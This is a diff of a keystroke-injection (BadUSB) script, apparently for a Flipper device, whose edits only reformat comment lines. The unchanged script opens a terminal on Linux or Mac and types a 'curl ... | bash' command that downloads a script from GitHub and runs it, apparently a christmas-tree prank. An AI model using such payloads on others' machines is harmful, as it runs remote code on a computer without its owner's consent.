@@ -4,15 +4,14 @@ DELAY 1000
 REM --------------- Try Linux ---------------
 ALT F2
 DELAY 200
-REM --------------- Try Mac ---------------
+REM ---------------- Try Mac ----------------
 GUI SPACE
 DELAY 200
-REM --------------- Load code ---------------
+REM ------------- Open Terminal -------------
 STRING terminal
 DELAY 250
 ENTER
 DELAY 250
-
-REM --------------- Consider self-hosting copy of that script ---------------
+REM ------- Consider self-hosting copy of that script -------
 STRING curl https://raw.githubusercontent.com/Landsil/flipper_things/main/badusb/curl_payloads/christmas_tree.sh | bash
 ENTER
